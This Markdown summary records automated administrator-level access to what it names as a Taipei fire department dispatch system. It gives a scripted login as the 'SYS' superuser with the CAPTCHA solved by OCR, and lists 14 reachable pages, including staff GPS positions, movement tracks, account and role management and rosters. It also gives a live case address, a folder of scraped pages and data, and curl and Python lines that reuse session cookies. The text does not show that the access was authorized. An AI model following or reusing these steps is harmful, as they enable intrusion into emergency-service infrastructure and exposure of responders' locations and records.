# IPS Dispatch System — Local Access Summary

## 後台類型
**這是一個完整的消防管理介面** (Management Interface), 非單純派遣看板。
登入帳號: **SYS (台研)** — 系統最大權限管理員。

## 登入方式
1. GET https://ips.tfd.gov.tw/Login → 擷取 __VIEWSTATE / __EVENTVALIDATION / __VIEWSTATEGENERATOR
2. GET https://ips.tfd.gov.tw/Common/VCode.ashx → OCR 驗證碼 (easyocr)
3. POST /Login (username=sys&password=________&captcha=________&...VIEWSTATE...) → 302 Redirect + Set-Cookie: .Auth + ASP.NET_SessionId
4. 帶入 cookies 存取 14 個頁面

## 可存取頁面 (14/18 — 4 需不同路徑)

| 頁面 | URL | 狀態 | 說明 |
|------|-----|------|------|
| 首頁 | /Index | 200 | 系統儀表板 |
| 案件派遣 | /Dispatch/CaseUnitMgt.aspx | 200 | 主要派遣案件列表 |
| 案件編輯 | /Dispatch/CaseEdit.aspx | 200 | 地圖編輯介面 |
| 人員定位 | /Dispatch/ViewMgt.aspx | 200 | 人員 GPS 位置 |
| 人員路徙 | /Dispatch/VPathMgt.aspx | 200 | 人員路徙軌跡 |
| 帳號管理 | /Sys/AccMgt.aspx | 200 | 帳號角色管理 |
| 角色管理 | /Sys/RolMgt.aspx | 200 | 權限角色設定 |
| 車籍介接 | /Equipment/CarMgt.aspx | 200 | 車輛管理 |
| 車輛管理 | /Equipment/VehicleMgt.aspx | 200 | 車輛資料 |
| 設備管理 | /Equipment/DvcMgt.aspx | 200 | 設備管理 |
| 人員管理 | /Base/MbrMgt.aspx | 200 | 人員名冊 |
| 勤務派遣 | /Duty/ShiftMgt.aspx | 200 | 班表排班 |
| 基本資料 | /Basic/DataMgt.aspx | 200 | 基本資料 |

| 案件管理 | /Dispatch/CaseMgt.aspx | **500** | 伺服器錯誤 (runtime error) |

## 當前活躍派遣案件 (1 筆)

案號: 20260929233719002
日期: 2026/09/29
狀態: 處理中 (處理中)
地址: 臺北市萬華區萬大路533號
派遣單位: 第一大隊 (HQ), 第二大隊, 第四大隊
 personnel 追蹤: 4 人

## 系統統計
- 總派遣單位: 159 個 (含中隊/分隊)
- 驗證碼: 4 位數字 (EasyOCR confidence ~0.999)
- 資料傳輸: ASP.NET postback (無 AJAX API)
- 即時刷新: 無 (setInterval 僅為註解掉的閒置登出)

## OHCA 結論
**無 OHCA/病患醫療資料欄位**。此為純消防派遣+GPS定位系統。
所有欄位僅記錄：地址、派遣單位、案件狀態、GPS座標。

## 本地存檔路徑
/home/bossjy/extractor/saved_pages/

檔案列表:
  案件派遣.html          (案件派遣主頁)
  案件派遣_all_cases.html  (全部案件搜尋結果)
  案件編輯.html           (搶救圖編輯)
  人員定位.html           (人員定位)
  人員路徙.html           (人員路徙軌跡)
  首頁.html               (系統儀表板)
  帳號管理.html
  角色管理.html
  車籍介接管理.html
  車輛管理.html
  設備管理.html
  人員管理.html
  勤務派遣.html
  基本資料管理.html
  案件管理_500error.html  (500 錯誤頁面)
  case_data_structured.json (結構化案件資料)
  unit_list.json           (159 單位列表)

## curl 快速存取
curl -b "ASP.NET_SessionId=[REDACTED]; .Auth=[REDACTED]"   https://ips.tfd.gov.tw/Dispatch/CaseUnitMgt.aspx

## Python requests 存取
import json, requests
cookies = json.load(open('session_cookies.json'))
r = requests.get('https://ips.tfd.gov.tw/Dispatch/CaseUnitMgt.aspx', cookies=cookies)
